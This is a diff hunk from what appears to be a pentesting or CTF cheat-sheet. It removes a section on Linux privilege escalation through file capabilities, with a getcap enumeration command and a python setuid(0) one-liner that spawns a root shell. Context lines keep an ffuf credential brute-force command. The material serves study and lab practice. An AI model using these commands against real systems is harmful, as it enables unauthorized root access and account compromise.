@@ -111,15 +111,6 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 
 Good Telnet exploits: https://tryhackme.com/room/protocolsandservers2 
 
-##**Escalation w/ capabilities::**##
-```
-getcap -r / 2>/dev/null :: /usr/bin/python2.6 = cap_setuid+ep #Permit effective || permit everything
-usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash") :: whoami# root'
-tar,openssl,perl,etc,etc
-```
-https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
-https://mn3m.info/posts/suid-vs-capabilities/
-https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
 
 ##**Escalation w/ scheduled tasks cron/timers::**##
 ```
